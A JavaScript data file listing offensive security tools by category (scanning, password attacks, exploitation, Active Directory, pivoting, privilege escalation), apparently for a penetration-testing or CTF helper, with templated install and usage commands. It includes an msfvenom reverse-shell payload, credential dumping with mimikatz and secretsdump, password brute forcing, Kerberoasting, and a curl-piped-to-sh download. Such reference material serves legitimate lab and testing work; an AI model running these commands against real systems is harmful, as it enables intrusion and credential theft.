export const TOOLS = [
  {
    category: "Scanning & Enumeration",
    tools: [
      { name: "nmap", desc: "Network port scanner and service detector", install: "sudo apt install nmap", usage: "nmap -p- --min-rate 5000 -sV -sC {TARGET_IP}" },
      { name: "gobuster", desc: "Directory/DNS/vhost brute forcer", install: "sudo apt install gobuster", usage: "gobuster dir -u http://{TARGET_IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt" },
      { name: "ffuf", desc: "Fast web fuzzer for dirs, params, vhosts", install: "sudo apt install ffuf", usage: "ffuf -w wordlist.txt -u http://{TARGET_IP}/FUZZ" },
      { name: "nikto", desc: "Web server vulnerability scanner", install: "sudo apt install nikto", usage: "nikto -h http://{TARGET_IP}" },
      { name: "enum4linux", desc: "SMB/RPC enumeration for Linux", install: "sudo apt install enum4linux", usage: "enum4linux -a {TARGET_IP}" },
      { name: "snmpwalk", desc: "SNMP MIB tree walker", install: "sudo apt install snmp", usage: "snmpwalk -v2c -c public {TARGET_IP}" },
      { name: "ldapsearch", desc: "LDAP directory query tool", install: "sudo apt install ldap-utils", usage: "ldapsearch -x -H ldap://{TARGET_IP} -b 'DC=domain,DC=local'" },
    ]
  },
  {
    category: "File Transfer",
    tools: [
      { name: "scp", desc: "Secure copy over SSH", install: "built-in (openssh-client)", usage: "scp file.txt {USERNAME}@{TARGET_IP}:/tmp/" },
      { name: "sftp", desc: "Interactive SSH file transfer", install: "built-in (openssh-client)", usage: "sftp {USERNAME}@{TARGET_IP}" },
      { name: "wget", desc: "Non-interactive file downloader", install: "sudo apt install wget", usage: "wget http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh" },
      { name: "curl", desc: "HTTP client for transfers and requests", install: "sudo apt install curl", usage: "curl -s http://{TARGET_IP}:8080/file.sh -o /tmp/file.sh" },
      { name: "certutil", desc: "Windows built-in file downloader", install: "built-in (Windows)", usage: "certutil -urlcache -split -f http://{TARGET_IP}:8080/file.exe C:\\Temp\\file.exe" },
      { name: "impacket-smbserver", desc: "Host SMB share for Windows file transfer", install: "pip install impacket", usage: "impacket-smbserver share . -smb2support" },
      { name: "python3 http.server", desc: "Quick HTTP server to serve files", install: "built-in (python3)", usage: "python3 -m http.server 8080" },
    ]
  },
  {
    category: "Password Attacks",
    tools: [
      { name: "hydra", desc: "Online brute force tool for many protocols", install: "sudo apt install hydra", usage: "hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP}" },
      { name: "hashcat", desc: "GPU-accelerated offline hash cracker", install: "sudo apt install hashcat", usage: "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt" },
      { name: "john", desc: "CPU-based hash cracker (John the Ripper)", install: "sudo apt install john", usage: "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt" },
      { name: "responder", desc: "LLMNR/NBT-NS poisoner for NTLM capture", install: "sudo apt install responder", usage: "sudo responder -I eth0 -wrf" },
      { name: "kerbrute", desc: "Kerberos user enumeration and brute force", install: "https://github.com/ropnop/kerbrute", usage: "kerbrute userenum -d {TARGET_DOMAIN} --dc {TARGET_IP} users.txt" },
    ]
  },
  {
    category: "Exploitation",
    tools: [
      { name: "sqlmap", desc: "Automated SQL injection exploitation", install: "sudo apt install sqlmap", usage: "sqlmap -u 'http://{TARGET_IP}/page?id=1' --dbs --batch" },
      { name: "msfvenom", desc: "Payload generator (part of Metasploit)", install: "sudo apt install metasploit-framework", usage: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -f exe -o shell.exe" },
      { name: "msfconsole", desc: "Metasploit Framework interactive console", install: "sudo apt install metasploit-framework", usage: "msfconsole -q" },
      { name: "evil-winrm", desc: "WinRM shell for Windows pentesting", install: "gem install evil-winrm", usage: "evil-winrm -i {TARGET_IP} -u {USERNAME} -p {PASSWORD}" },
    ]
  },
  {
    category: "SMB & AD",
    tools: [
      { name: "crackmapexec", desc: "Swiss army knife for SMB/AD attacks", install: "sudo apt install crackmapexec", usage: "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --shares" },
      { name: "smbclient", desc: "SMB share browser and file transfer", install: "sudo apt install smbclient", usage: "smbclient //{TARGET_IP}/share -U '{USERNAME}%{PASSWORD}'" },
      { name: "smbmap", desc: "SMB share permission mapper", install: "sudo apt install smbmap", usage: "smbmap -H {TARGET_IP} -u {USERNAME} -p {PASSWORD}" },
      { name: "impacket-psexec", desc: "Remote SYSTEM shell via SMB", install: "pip install impacket", usage: "impacket-psexec {USERNAME}:{PASSWORD}@{TARGET_IP}" },
      { name: "impacket-secretsdump", desc: "Remote hash dumping via SMB", install: "pip install impacket", usage: "impacket-secretsdump {USERNAME}:{PASSWORD}@{TARGET_IP}" },
      { name: "impacket-GetUserSPNs", desc: "Kerberoasting — request TGS tickets", install: "pip install impacket", usage: "impacket-GetUserSPNs {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {TARGET_IP} -request" },
      { name: "bloodhound-python", desc: "Remote BloodHound data collector", install: "pip install bloodhound", usage: "bloodhound-python -u {USERNAME} -p {PASSWORD} -d {TARGET_DOMAIN} -dc {TARGET_IP} -c All" },
    ]
  },
  {
    category: "Pivoting & Tunneling",
    tools: [
      { name: "chisel", desc: "Fast TCP/UDP tunnel over HTTP", install: "https://github.com/jpillora/chisel", usage: "# Attacker: ./chisel server -p 8001 --reverse\n# Target:   ./chisel client {TARGET_IP}:8001 R:socks" },
      { name: "ligolo-ng", desc: "TUN-based tunneling (faster than chisel)", install: "https://github.com/nicocha30/ligolo-ng", usage: "# Attacker: ./proxy -selfcert\n# Target:   ./agent -connect {TARGET_IP}:11601 -ignore-cert" },
      { name: "proxychains", desc: "Route tools through SOCKS proxy", install: "sudo apt install proxychains4", usage: "proxychains nmap -sT -Pn {TARGET_IP}" },
      { name: "socat", desc: "Multipurpose relay and port forwarder", install: "sudo apt install socat", usage: "socat TCP-LISTEN:8080,fork TCP:{PIVOT_IP}:80" },
      { name: "ssh", desc: "SSH tunneling and SOCKS proxy", install: "built-in (openssh-client)", usage: "ssh -D 1080 -f -N {USERNAME}@{PIVOT_IP}" },
    ]
  },
  {
    category: "RDP",
    tools: [
      { name: "xfreerdp", desc: "Feature-rich RDP client for Linux", install: "sudo apt install freerdp2-x11", usage: "xfreerdp /v:{TARGET_IP} /u:{USERNAME} /p:{PASSWORD} /cert:ignore +clipboard" },
      { name: "rdesktop", desc: "Lightweight RDP client", install: "sudo apt install rdesktop", usage: "rdesktop -u {USERNAME} -p {PASSWORD} {TARGET_IP}" },
      { name: "hydra (rdp)", desc: "Brute force RDP credentials", install: "sudo apt install hydra", usage: "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1" },
    ]
  },
  {
    category: "Privilege Escalation",
    tools: [
      { name: "linpeas", desc: "Linux privilege escalation enumerator", install: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", usage: "curl -sL https://...linpeas.sh | sh" },
      { name: "winpeas", desc: "Windows privilege escalation enumerator", install: "https://github.com/carlospolop/PEASS-ng", usage: ".\\winPEASx64.exe" },
      { name: "mimikatz", desc: "Windows credential dumper", install: "https://github.com/gentilkiwi/mimikatz", usage: "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit" },
      { name: "PrintSpoofer", desc: "SeImpersonatePrivilege → SYSTEM", install: "https://github.com/itm4n/PrintSpoofer", usage: ".\\PrintSpoofer64.exe -i -c cmd" },
      { name: "GodPotato", desc: "Potato attack for SYSTEM escalation", install: "https://github.com/BeichenDream/GodPotato", usage: ".\\GodPotato.exe -cmd 'cmd /c whoami'" },
    ]
  },
]
